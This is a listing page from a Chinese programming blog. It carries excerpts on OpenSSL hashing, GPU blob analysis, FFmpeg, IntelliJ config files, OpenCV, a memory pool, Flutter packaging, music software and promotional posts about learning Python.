<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="菜鸟程序员博客">
		<meta property="og:title" content="菜鸟程序员博客" />
<meta property="og:description" content="菜鸟程序员博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://cainiaoprogram.github.io/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="菜鸟程序员博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3252facec9e207384e01de4ddb40fb3e/" rel="bookmark">
			使用openssl计算文件的md5,sha256,以及用aes算法对密码进行加密
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
计算文件md5值
计算文件SHA-256值
使用 openssl api 用aes算法 对密码加密和解密
计算文件md5值 要使用 OpenSSL API 计算文件的 MD5 值，您可以使用 OpenSSL 提供的一组函数。以下是一个简单的示例，演示如何使用 OpenSSL API 计算文件的 MD5 值：
#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;openssl/md5.h&gt; #define BUFFER_SIZE 1024 int calculate_md5(const char *filename, unsigned char *digest) { FILE *file = fopen(filename, "rb"); if (!file) { perror("Unable to open file"); return -1; } MD5_CTX md5_context; MD5_Init(&amp;md5_context); unsigned char buffer[BUFFER_SIZE]; size_t bytesRead; while ((bytesRead = fread(buffer, 1, BUFFER_SIZE, file)) !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3252facec9e207384e01de4ddb40fb3e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/63ce29519a2c08a4926e137b3dc6b253/" rel="bookmark">
			GPU连通域分析方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第1章连通域分析方法 连通域分析方法用于提取图像中相似属性的区域，并给出区域的面积，位置等特征信息。分为两种，基于游程（Runlength），和基于标记(Label)。
基于游程的方法，按照行对图像进行游程编码，然后，进行深度优先的逐区域扫描，或者广度优先逐行扫描的游程连接。一般来说广度优先扫描只需要扫描一遍游程即得到区域信息，效率较深度优先高。
基于标记的方法，使用一张标记图，将原始图中相似属性的区域，在标记图中赋值为相同的像素。再对标记图进行后处理，得到区域信息。
经过测试，基于游程的方案，不管是传输原始blob图到CPU进行游程提取与连接，还是在GPU中对blob图提取游程（压缩），只拷贝（压缩后）游程信息到CPU，其耗时都比较高。
在3060显卡上，只有当游程像素不超过全图的0.5%的情况下，才会比拷贝全图的方案有优势。在3090显卡上，只有当游程像素不超过全图的1.5%的情况下，才会比拷贝全图的方案有优势。
因此调研了在GPU上进行连通域分析的方法，认为基于标记的方法更适合在GPU上运行，在GPU上直接得到Blob缺陷信息。
基于标记的Komura方法，当前未优化代码，8k8k图像的区域标记在Nvidia的RTX4080上，仅需要3ms，Playne方法仅需要2.4ms。标记压缩耗时当前可以优化到11ms，区域信息提取并拷贝到CPU，需要1ms。相当于15ms内就完成了8k8k图像的blob分析。而基于游程的方法，仅从GPU拷贝8k8k图像的理论耗时就耗时7ms（64M/(12.8G/s70%)），即使采用GPU游程压缩方法，游程压缩步骤耗时也在7ms。
1.1.基于游程的方法 首先对图像按行进行游程编码，然后进行游程连接。
1.1.1.游程编码 描述方法为：(x1,x2,y)，x采用左闭右开区间。(1,6,1),(2,5,2)。采用2个三元组即描述了如上的区域。
该算法逐个读取像素，和阈值进行比较，实际执行效率极其低下。以下为采用SIMD并行指令集优化后的代码片段。
核心的指令共四条：alignr，xor，cmp1，cmp2。
mres = _mm_loadu_si128((const __m128i*)(pBlob1-16))//0-15 m1 = _mm_loadu_si128((const __m128i*)pBlob1); //16-31 mOffset = _mm_alignr_epi8(m1, mres, 1); //1-16 //mH, mL 作差， 一个非0，一个是0，则对应位置赋值为1 mR = _mm_xor_si128(_mm_cmpeq_epi8(mres, mzero), _mm_cmpeq_epi8(mOffset, mzero)); auto a = _pext_u64(_pos, mR.m128i_u64[0]); while ((uint8_t)a) { pRun1[++n1Count] = x * 16 + uint8_t(a); a = a &gt;&gt; 8; } auto b = _pext_u64(_pos, mR.m128i_u64[1]); while ((uint8_t)b) { pRun1[++n1Count] = x * 16 + 8 + uint8_t(b); b = b &gt;&gt; 8; } alignr实现像素的错位,根据0-15和16-31，生成1-16。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/63ce29519a2c08a4926e137b3dc6b253/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/73dbc13dc018cd677ab2d0df2acbc26b/" rel="bookmark">
			怎么让视频进行加速处理并保存
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		要加速处理视频并保存，可以使用专业的视频编辑软件或者一些在线工具。以下是一种常见的方法，使用FFmpeg这个开源工具。请确保你已经安装了FFmpeg。
打开命令行界面： 打开终端或命令提示符窗口。
使用以下命令进行视频加速处理：
ffmpeg -i input.mp4 -vf "setpts=0.5*PTS" -filter:a "atempo=2.0" output.mp4 这个例子将视频加速两倍。你可以调整命令中的参数来设置不同的加速倍数。
setpts=0.5*PTS 用于调整视频的时间戳，这里的0.5表示加速倍数为2倍。atempo=2.0 用于调整音频的速度，这里的2.0表示加速倍数为2倍。 请替换 input.mp4 和 output.mp4 为你的输入和输出文件名。
执行命令： 按下Enter键执行命令。
等待处理完成： FFmpeg将处理视频并保存输出文件。
请注意，加速倍数越大，可能会导致视频和音频的质量损失，因此你可能需要根据具体情况进行调整。此外，这只是一个基本的例子，你可以根据需要使用其他参数和过滤器进行更高级的调整。
FFmpeg 是一个开源的跨平台多媒体处理工具，它可以在多个操作系统上运行，包括 Linux、Windows、macOS 等。因此，它不仅限于 Linux 系统，也可以在其他操作系统上使用。
在 Linux 中，你可以通过包管理器安装 FFmpeg。例如，在基于 Debian 的系统上，你可以使用以下命令安装：
sudo apt-get install ffmpeg 在基于 Red Hat 的系统上，可以使用以下命令：
sudo yum install ffmpeg 在 Windows 和 macOS 上，你可以从 FFmpeg 官方网站（https://ffmpeg.org/download.html）下载预编译的可执行文件，然后按照官方文档或相关教程进行安装和使用。
总之，FFmpeg 是一个跨平台工具，可以在不同的操作系统上使用。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0e0c6cb38d66daf4b6f7a4c43d84177c/" rel="bookmark">
			采用intellij idea作为IDE的java项目由于*.iml文件导致无法编译问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		将项目中所有的iml文件删除，然后idea重新打开项目、编译，问题解决。
从git上将spring boot项目下载，用intellij idea打开，结果无法编译，提示“程序包com.fasterxml.jackson.core不存在”。编译来编译去，又清缓存，都不行。
查看pom.xml，虽然没有显式依赖这个com.fasterxml.jackson.core，但“External Libraries”里却有这个com.fasterxml.jackson.core。而且，同样的代码，其他同事编译一点问题没有。
发觉idea总是提示：unable to save plugin settings。我忽然想到，是不是*.iml的问题。大概率是其他同事提交代码时，也将这些*.iml文件一起上传了。由于iml文件与每台机器环境关联，因此不同机器直接使用，就有可能出现问题。
后来将项目中所有的iml文件删除，然后idea重新打开项目、编译，问题解决。
iml文件由intellij idea自动生成，用于存储项目中的模块（modules)信息。
*.iml文件
idea 对module 配置信息之意， infomation of module
iml是 intellij idea的工程配置文件，里面是当前project的一些配置信息。
在这里插入图片描述
.idea文件夹
.idea存放项目的配置信息，包括历史记录，版本控制信息等。*
创建git项目时，应该将这些文件写进忽略名单：
.gitignore
# maven ignore target/ *.war *.ear *.tar *.tar.gz # eclipse ignore .settings/ .project .classpath # idea ignore .idea/ *.ipr *.iml *.iws # logs # logs # temp ignore *.log *.cache *.diff *.patch *.tmp *.java~ *.properties~ *.xml~ # system ignore .DS_Store Thumbs.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0e0c6cb38d66daf4b6f7a4c43d84177c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/adbb0fc295421906dd9a9c35a0a30e62/" rel="bookmark">
			openCV入门
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		简介 本文主要通过对啥都会一点研究生系列进行总结，对关键代码进行注释，方便使用以及复习。
1 基础功能 1.1.显示图片 import cv2 # 读取图片 img = cv2.imread("Resources/lena.png") # 显示图片 cv2.imshow("Lena Soderberg",img) # 毫秒级延时 0表示一直延时 1000表示一秒 cv2.waitKey(0) 1. 2.显示视频 import cv2 # 导入视频 cap = cv2.VideoCapture("Resources/test_ video.mp4") while True: # success：布尔值是否为真 success, img = cap.read() # 视频框名称 cv2.imshow("Result", img) # 按q 中断循环 if cv2.waitKey(1) &amp; 0xFF == ord('q'): break 1.3.摄像头显示 import cv2 frameWidth = 640 frameHeight = 480 # 0：默认相机序号 cap = cv2.VideoCapture(0) # 参数：3：在视频流的帧的宽度 # 参数：4：在视频流的帧的高度 # 参数：10：在视频流的帧的亮度 cap.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/adbb0fc295421906dd9a9c35a0a30e62/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/86a159745dee0fd2d97e71decfa510dd/" rel="bookmark">
			高并发内存池
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		项目介绍 本项目实现的是一个高并发的内存池，它的原型是Google的一个开源项目tcmalloc，tcmalloc全称Thread-Caching Malloc，即线程缓存的malloc，实现了高效的多线程内存管理，用于替换系统的内存分配相关函数malloc和free。
cmalloc的知名度也是非常高的，不少公司都在用它，比如Go语言就直接用它做了自己的内存分配器。该项目就是把tcmalloc中最核心的框架简化后拿出来，模拟实现出一个mini版的高并发内存池，目的就是学习tcmalloc的精华。该项目主要涉及C/C++、数据结构（链表、哈希桶）、操作系统内存管理、单例模式、多线程、互斥锁等方面的技术。 内存池介绍 池化技术
在说内存池之前，我们得先了解一下“池化技术”。所谓“池化技术”，就是程序先向系统申请过量的资源，然后自己进行管理，以备不时之需。
之所以要申请过量的资源，是因为申请和释放资源都有较大的开销，不如提前申请一些资源放入“池”中，当需要资源时直接从“池”中获取，不需要时就将该资源重新放回“池”中即可。这样使用时就会变得非常快捷，可以大大提高程序的运行效率。
在计算机中，有很多使用“池”这种技术的地方，除了内存池之外，还有连接池、线程池、对象池等。以服务器上的线程池为例，它的主要思想就是：先启动若干数量的线程，让它们处于睡眠状态，当接收到客户端的请求时，唤醒池中某个睡眠的线程，让它来处理客户端的请求，当处理完这个请求后，线程又进入睡眠状态。
内存池
内存池是指程序预先向操作系统申请一块足够大的内存，此后，当程序中需要申请内存的时候，不是直接向操作系统申请，而是直接从内存池中获取；同理，当释放内存的时候，并不是真正将内存返回给操作系统，而是将内存返回给内存池。当程序退出时（或某个特定时间），内存池才将之前申请的内存真正释放。
内存池主要解决的问题
内存池主要解决的就是效率的问题，它能够避免让程序频繁的向系统申请和释放内存。其次，内存池作为系统的内存分配器，还需要尝试解决内存碎片的问题。
内存碎片分为内部碎片和外部碎片：
外部碎片是一些空闲的小块内存区域，由于这些内存空间不连续，以至于合计的内存足够，但是不能满足一些内存分配申请需求。内部碎片是由于一些对齐的需求，导致分配出去的空间中一些内存无法被利用。 **注意： **内存池尝试解决的是外部碎片的问题，同时也尽可能的减少内部碎片的产生。
malloc
C/C++中我们要动态申请内存并不是直接去堆申请的，而是通过malloc函数去申请的，包括C++中的new实际上也是封装了malloc函数的。
我们申请内存块时是先调用malloc，malloc再去向操作系统申请内存。malloc实际就是一个内存池，malloc相当于向操作系统“批发”了一块较大的内存空间，然后“零售”给程序用，当全部“售完”或程序有大量的内存需求时，再根据实际需求向操作系统“进货”。
malloc的实现方式有很多种，一般不同编译器平台用的都是不同的。比如Windows的VS系列中的malloc就是微软自行实现的，而Linux下的gcc用的是glibc中的ptmalloc。
定长内存池的实现 malloc其实就是一个通用的内存池，在什么场景下都可以使用，但这也意味着malloc在什么场景下都不会有很高的性能，因为malloc并不是针对某种场景专门设计的。
定长内存池就是针对固定大小内存块的申请和释放的内存池，由于定长内存池只需要支持固定大小内存块的申请和释放，因此我们可以将其性能做到极致，并且在实现定长内存池时不需要考虑内存碎片等问题，因为我们申请/释放的都是固定大小的内存块。
我们可以通过实现定长内存池来熟悉一下对简单内存池的控制，其次，这个定长内存池后面会作为高并发内存池的一个基础组件。
如何实现定长？
在实现定长内存池时要做到“定长”有很多种方法，比如我们可以使用非类型模板参数，使得在该内存池中申请到的对象的大小都是N。
template&lt;size_t N&gt; class ObjectPool {}; 此外，定长内存池也叫做对象池，在创建对象池时，对象池可以根据传入的对象类型的大小来实现“定长”，因此我们可以通过使用模板参数来实现“定长”，比如创建定长内存池时传入的对象类型是int，那么该内存池就只支持4字节大小内存的申请和释放。
template&lt;class T&gt; class ObjectPool {}; 如何直接向堆申请空间？
既然是内存池，那么我们首先得向系统申请一块内存空间，然后对其进行管理。要想直接向堆申请内存空间，在Windows下，可以调用VirtualAlloc函数；在Linux下，可以调用brk或mmap函数。
#ifdef _WIN32 #include &lt;Windows.h&gt; #else //... #endif //直接去堆上申请按页申请空间 inline static void* SystemAlloc(size_t kpage) { #ifdef _WIN32 void* ptr = VirtualAlloc(0, kpage&lt;&lt;13, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); #else // linux下brk mmap等 #endif if (ptr == nullptr) throw std::bad_alloc(); return ptr; } 这里我们可以通过条件编译将对应平台下向堆申请内存的函数进行封装，此后我们就不必再关心当前所在平台，当我们需要直接向堆申请内存时直接调用我们封装后的SystemAlloc函数即可。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/86a159745dee0fd2d97e71decfa510dd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1be6b847866637f97c75aa43cc23026c/" rel="bookmark">
			Flutter 混合开发 - aar打包
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		背景 项目接入 Flutter 后有两种方式，一种是 module 引入开发，一种是 aar 依赖开发。当前项目中在 Debug 阶段为了方便调试采用 module 开发，在发版时（即 Release 阶段）采用 aar 依赖引入。为了配合这种模式就需要在 release 阶段将 aar 上传至公司 maven 仓库中，但目前 Flutter 仅提供本地发布，所以下面基于官方脚本修改，实现上传至公司 maven。
打包脚本 修改自: Flutter 仓库中的 aar_init_script.gradle。路径 -&gt;flutter/packages/flutter_tools/gradle/aar_init_script.gradle
import java.nio.file.Paths import org.gradle.api.Project import org.gradle.api.artifacts.Configuration import org.gradle.api.publish.maven.MavenPublication void configureProject(Project project, String outputDir) { if (!project.hasProperty("android")) { throw new GradleException("Android property not found.") } if (!project.android.hasProperty("libraryVariants")) { throw new GradleException("Can't generate AAR on a non Android library project."); } project.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1be6b847866637f97c75aa43cc23026c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/03daf1bdaee81f19f3a55f7bf2b80dbc/" rel="bookmark">
			音乐制作软件Studio One mac有哪些特点
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Studio One mac是一款专业的音乐制作软件，该软件提供了全面的音频编辑和混音功能，包括录制、编曲、合成、采样等多种工具，可用于制作各种类型的音乐，如流行音乐、电子音乐、摇滚乐等。
Studio One mac软件特点
1. 直观易用的界面：该软件拥有简洁、直观的用户界面，使得音乐制作变得更加简单和容易上手。
2. 多种音频处理工具：Studio One提供了多种音频处理工具，如EQ、压缩器、失真器等，以及多种音效插件和虚拟乐器，方便用户进行混音和音频处理。
3. 高品质音频引擎：Studio One使用高品质的音频引擎，能够提供出色的音频表现和效果。
4. 先进的音频编辑功能：该软件提供了先进的音频编辑功能，如自动延长、事件编辑、时间轴编辑等，可大大提高制作效率。
5. 与硬件设备的兼容性：Studio One支持各种硬件设备和控制器，如MIDI键盘、控制表、效果器等，可以让用户更方便地进行音乐制作和演出。
总之，Studio One是一款功能强大、易于使用的音乐制作软件，提供了多种音频编辑和混音功能，可用于制作各种类型的音乐。它具有直观易用的界面、高品质的音频引擎、先进的音频编辑功能以及与硬件设备的兼容性等特点，深受音乐制作人员和音乐爱好者的青睐。
苹果：Studio One 6 for mac(音乐制作工具) v6.5.1中文版
Win：PreSonus Studio One Pro6(音乐制作编曲软件)
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4d114200edf3e27c44ec66c625fd7586/" rel="bookmark">
			零基础学python要多久？真的能学会吗？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		零基础进行Python学习的话，如果选择自学，一般学习周期在一年半左右。选择进行培训的话，学习Python周期一般在五到六个月左右，不过学习的种类不同，班级不同，培训周期也是存在一定差异的。
零基础学python需要多久 如果是自学，从零基础开始学习Python的话，依照每个人理解能力的不同，大致上需要一年半左右的时间，一切要看你学的效果。
当然，如果有其它编程语言的经验，入门还是非常快的，大概需要2~3个月可以对上手Python语言编写一些简单的应用。
无论是新手还是有一定基础的朋友，有一个有经验的人带着自己学习还是非常不错的，尤其是零基础的，一般6个月就可以基本学会。
任何知识都是基础入门比较快，达到精通的程序是需要时日的，这是一个逐渐激烈的过程。
精通任何一门编程语言，都需要通过大量的实践来积累经验，解决遇到的各种疑难问题，看别人的源码，分享自己的分码的这个过程，才能够精通Python的方方面面。从编程的一开始，就应该不断的动手去编写代码，不停的去实践，不停的去修改，不停的总结经验，最终才能熟能生巧，达到精通。
Python都学什么 1、首先要学好Linux
Linux是作为开发者必须要掌握的操作平台，在这个平台上无论是开发web项目，运行SQL数据库还是部署爬虫、大数据分析、以及AI开发，都可以很好的实现；
2、掌握Python基础
作为一门编程语言的学习，大概可以分为几个部分：编程语法、面向对象的编程思想、常用设计模式、常用排序算法，这些内容展开有很多，在此不一一赘述；
3、掌握数据库SQL
内容有关系型数据库表的设计、增删改查以及SQL语句的编写、SQL和NoSQL数据库的使用场景和设计难点、Python对数据库的连接；
4、熟悉一些前端的知识
主要是HTML、CSS、Java和框架，了解时下流行的网页风格和特效；
5、了解web全栈开发
提醒大家，重点是掌握Django框架，以此来了解如何开发一个完备的企业级网站；
6、掌握人工智能（爬虫及搜索）
内容包括HTTP调试器用法、将爬虫抓取的数据建立索引并搜索、单机或分布式的索引引擎。
关于Python技术储备 学好 Python 不论是就业还是做副业赚钱都不错，但要学会 Python 还是要有一个学习规划。最后大家分享一份全套的 Python 学习资料，给那些想学习 Python 的小伙伴们一点帮助！
Python入门基础教程 如果你是准备学习Python或者正在学习，下面这些你应该能用得上：
① Python所有方向的学习路线图，清楚各个方向要学什么东西
② 100多节Python课程视频，涵盖必备基础、爬虫和数据分析
③ 100多个Python实战案例，学习不再是只会理论
④ 华为出品独家Python漫画教程，手机也能学习
⑤ 历年互联网企业Python面试真题,复习时非常方便
上述这份完整版的Python全套学习资料已经上传CSDN，朋友们如果需要可以微信扫描下方CSDN官方认证二维码免费领取【保证100%免费】
一、Python所有方向的学习路线
Python所有方向路线就是把Python常用的技术点做整理，形成各个领域的知识点汇总，它的用处就在于，你可以按照上面的知识点去找对应的学习资源，保证自己学得较为全面。
二、Python课程视频
我们在看视频学习的时候，不能光动眼动脑不动手，比较科学的学习方法是在理解之后运用它们，这时候练手项目就很适合了。
三、Python实战案例
光学理论是没用的，要学会跟着一起敲，要动手实操，才能将自己的所学运用到实际当中去，这时候可以搞点实战案例来学习。
四、Python漫画教程
用通俗易懂的漫画，来教你学习Python，让你更容易记住，并且不会枯燥乏味。
五、互联网企业面试真题
我们学习Python必然是为了找到高薪的工作，下面这些面试题是来自阿里、腾讯、字节等一线互联网大厂最新的面试资料，并且有阿里大佬给出了权威的解答，刷完这一套面试资料相信大家都能找到满意的工作。
这份完整版的Python全套学习资料已经上传CSDN，朋友们如果需要可以微信扫描下方CSDN官方认证二维码免费领取【保证100%免费】
总结 坚持到了这儿，恭喜你，表示你有做开发的潜力，其实我想说的上面的内容还是刚刚开始，刚开始大家不需要多么精通了解这些内容，除了Python方面的知识，每个部分掌握一点儿能进行基本开发就好，主要是不断练习，让自己跳出「舒适区」，进入「学习区」，但是又不进入「恐慌区」，不断给自己「喂招」。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6225783c8d1278f897556b92fdd10981/" rel="bookmark">
			千万别再瞎学Python了（当心学废了），过来人的一些学习经验，能让你少走弯路
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我当初选择学习Python，其实自己也是盲目的，毕竟是转行过来，之前对编程领域根本不了解。这还得多亏我的那位亲戚指点，才少走了很多弯路。他当时告诉我要我学习Python主要有以下几点原因：
1、Python的优势 相比较其他语言，Python有简单易学、免费开源、可移植性强、丰富的库、可扩展性、可嵌入型、规范的代码等优势。而且由于Python是解释语言，程序写起来非常方便。
2、Python的用途 Python虽然相比C/C++/Java以及C#等编程语言来说，并非是不可代替的语言，但是Python的影响力随着时代的发展，已经超越了这些前辈语言。目前Python已经涉及到文本处理、web编程、数学处理、数据库编程、系统运维、图形处理、网络编程、多媒体应用、pymo引擎、黑客编程、爬虫编写、机器学习、人工智能等等，应用可谓是非常广。
3、Python的薪资待遇 不说其他的领域，就单单人工智能目前已经上升到了国家战略级别，而Python在人工智能方面的卓越表现，让这个领域产生了大量的Python技术岗位需求，就连普通二、三线城市的Python工程师都达到了10-20万的年薪，更别提北、上、广、深这样的一线大城市。
4、Python的行业前景 随着5G时代了到来，发展人工智能上升到了国家战略高度，而Python作为其中“胶水”的作用，在目前的大环境和大背景下，有着强有力的优势。而且随着开源技术平台愈加丰富，Python构建的生态环境也会越来越完善。
其实学习的方法是因人而异的，可以根据自己选择的方向来调整。下面分享一些我个人的一些学习建议：
1、选择好学习目标 只有知道了自己的学习方向，才明白自己学习Python是要达到什么目的，这样才能让自己学习思路更清晰。像网络爬虫、web开发、数据分析、人工智能、自动化运维、人工智能AI、游戏开发等这些领域，你对哪个感兴趣，就往哪方面去深耕，只有用心钻研，才能获得与这个领域相匹配的能力！
2、制定学习计划 我个人是把Python学习分成了基础、高级、大师3个学习阶段：
基础阶段主要学习： Linux基础、数据类型，字符串，判断/循环语句，函数，命名空间，作用域，类与对象，继承，多态，tkinter界面编程，文件与异常，数据处理等。
高级阶段主要学习： Python常见第三方库与网络编程，Python正则表达式，邮箱爬虫，文件遍历，金融数据爬虫，多线程爬虫，Python线程、进程，Python MySQL数据库，协程，jython等。
大师阶段主要学习： Linux运维自动化开发、数据分析、大数据、机器学习基础知识，KNN算法，线性回归，逻辑斯蒂回归算法，决策树算法，朴素贝叶斯算法，支持向量机，聚类k-means算法等。
看到这么多要学的，是不是开始头晕眼花了？其实现阶段的你，只需要了解这些是未来要学习的就好了，后面跟着计划一步一步的学，也并没有多困难。
3、基础一定要扎实 有道是万丈高楼平地起，只有地基牢固了，才能建起万丈高楼（作为转行人员，深受基础不够扎实的苦）。所以学习编程也是一样，只有把基础知识学扎实了，才能让你更好的理解后面的知识，才能在这个领域深耕下去。所以下面这些基础一定要熟练掌握：
数据的储存、运算符表达式、循环、基础数据结构、函数、模块、面向对象编程、继承、封装、多态、面向对象高阶、文件操作与异常处理、高阶函数与测试、排列组合与正则表达、网路编程等等.
4、多动手实操 实践是检验理论的唯一方式，根据你在学习期间掌握的理论知识，进行实践操作，这样才能了解你的真实能力，才能知道自己在学习中，有哪些知识掌握不够。
下面分享个初级练习案例：
题目： 输入三个整数x,y,z，请把这三个数由小到大输出。
程序分析： 我们想办法把最小的数放到x上，先将x与y进行比较，如果x&gt;y则将x与y的值进行交换，然后再用x与z进行比较，如果x&gt;z则将x与z的值进行交换，这样能使x最小。
程序源代码：
l = [] for i in range(3): x = int(raw_input('integer:\n')) l.append(x) l.sort() print l 123456789 是不是很简单？只要多学多练，其实编程就是解各种题目。
5、多结交些Python大佬 在学习期间，你肯定会遇到自己无法解决的疑难问题，如果你能有个遇到几个喜欢乐于助人的前辈大佬，让你头疼大半天的问题，也许他们只用两三句话，就能轻松帮你解决。这一点我自己就深受其益，不论是学习，还是后面找工作，都对我有相当大的帮助。
我是一位转行到互联网行业的新人，分享的都是一些自己的学习经历和干货，如果你是准备学习Python或者正在学习，下面这些你应该也能用得上：
① Python所有方向的学习路线图，清楚各个方向要学什么东西
② 100多节Python课程视频，涵盖必备基础、爬虫和数据分析
③ 100多个Python实战案例，学习不再是只会理论
④ 华为出品独家Python漫画教程，手机也能学习
⑤ 历年互联网企业Python面试真题,复习时非常方便
上述这份完整版的Python全套学习资料已经上传CSDN，朋友们如果需要可以微信扫描下方CSDN官方认证二维码免费领取【保证100%免费】
一、Python所有方向的学习路线
Python所有方向路线就是把Python常用的技术点做整理，形成各个领域的知识点汇总，它的用处就在于，你可以按照上面的知识点去找对应的学习资源，保证自己学得较为全面。
二、Python课程视频
我们在看视频学习的时候，不能光动眼动脑不动手，比较科学的学习方法是在理解之后运用它们，这时候练手项目就很适合了。
三、Python实战案例
光学理论是没用的，要学会跟着一起敲，要动手实操，才能将自己的所学运用到实际当中去，这时候可以搞点实战案例来学习。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6225783c8d1278f897556b92fdd10981/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/74004d35f68a162aa63b7d3dc87ff378/" rel="bookmark">
			基于微信小程序的毕业设计选题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 目录
一、大体实现思路
二、如何避坑？
三、题目推荐列表
四、部分案例展示
最后
大家好，这里是一点毕设，今天主要针对于微信小程序毕业设计选题的相关问题做一下统一解答，同时今天学长整理出来了一些微信小程序题目供大家参考，希望对大家有一定帮助！对于选题开题都可与学长沟通哦，联系方式见文末。
一、大体实现思路 小程序端通常都是展示数据给用户去看的，大多数情况下，这些数据不是写死的，而是前端发送请求到后端去获取数据。后端可以用很多技术去实现，比如Java、PHP、NodeJs等等，而后端接口最终都是存取数据库中的数据，因为很多小程序存在大量的数据这些是需要存储到数据库（MySQL、Oracle、MongoDB）等等，除了小程序端和后台接口以外，小程序毕设的话一般都要搭配后台管理系统，后台管理系统一般就是网页，需要具备一定的web技术知识来实现，如果小程序需要上线到微信客户端上，还需要把后端部署在服务器上，并且小程序端的代码上传到微信公众平台上，并且需要去申请域名，还需要一个较长时间的备案，当然如果仅仅是毕设演示的话可以不上线的，在微信开发者工具上演示就可以了。
二、如何避坑？ 俗话说万事开头难，对于计算机小程序的毕设而言更是如此，选题合适会让你在毕业季轻松很多
1、自己选题的不要凭空进行想象，一定要做到不能盲目选题，定题目就意味着以后要实全力以赴实现题目对应的功能（要在可控范围内），要结合自身现实情况来选择难度和自己院校现阶段符合的。有些看似简单问题，实际不符合现阶段，成本也会成倍增加，如果有选题/开题不明白的地方可以与我随时沟通，欢迎打扰。
2、老师指定，尽量避开老师的科研题目，除非是老师做好的，就是让你拿来用的，要结合自己了解层次，学习成本太高的直接和老师进行沟通。如果老师不能完整的帮到自己，申请换题目。
三、题目推荐列表 ssm新冠疫苗预约小程序ssm高校毕业论文管理系统小程序ssm数学辅导微信小程序springboot医院核酸检测预约挂号微信小程序ssm基于微信小程序的校园商铺系统ssm基于微信小程序的短视频系统springboot党员之家服务系统小程序ssm微信小程序的英语学习激励系统ssm微信小程序的驾校预约管理系统ssm捷邻小程序ssm基于微信小程序的付费自习室系统ssm微信小程序的学生选课系统ssm电动车智能充电服务平台ssm基于微信小程序的学习资料销售平台ssm基于微信小程序的游泳馆管理系统ssm面向企事业单位的项目申报小程序ssm农产品自主供销小程序ssm“最多跑一次”微信小程序springboot驾校报名小程序ssm基于微信小程序的电影交流平台ssm基于微信小程序的新生自助报到系统ssm基于微信小程序的智能停车场管理系统ssm游戏美术外包管理信息系统springboot疫情核酸预约小程序ssm同城交易小程序小程序springboot桥牌计分系统ssm基于微信小程序的电影院票务系统ssm学生购电小程序ssm基于微信小程序的自习室预约系统ssm基于微信小程序的足浴城消费系统ssm校运会运动会管理系统小程序ssm微信阅读小程序ssm基于微信小程序的短视频系统ssm基于微信小程序的学生宿舍管理系统小程序springboot沁园健身房预约管理系统ssm基于微信小程序的食堂窗口自助点餐系统ssm基于微信小程序的美容院管理系统ssm游乐园智慧向导小程序ssm考研知识题库小程序springboot基于微信小程序的高校餐厅食品留样管理系统ssm小程序远程家庭健康监测管理系统ssm基于微信小